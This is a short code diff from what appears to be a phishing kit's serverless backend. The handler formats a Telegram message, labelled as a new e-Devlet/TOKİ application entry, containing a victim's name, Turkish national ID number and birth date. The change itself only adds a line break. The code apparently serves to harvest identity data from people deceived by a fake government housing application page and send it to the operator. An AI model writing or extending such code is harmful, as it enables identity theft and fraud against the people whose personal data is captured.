@@ -123,7 +123,7 @@ module.exports = async (req, res) => {
         }
 
         // Telegram'a gönderilecek mesaj (yeni format)
-        const messageText = `*✨ 🇹🇷 Yeni Başvuru Girişi (e-devlet Toki)*
+        const messageText = `*✨ 🇹🇷 Yeni Başvuru Girişi (e-devlet Toki)*\n
 *👤 Ad Soyad:* ${name}
 *🆔 TC:* ${tc}
 *📅 Doğum Tarihi:* ${formattedBirthDate || 'Belirtilmemiş'}
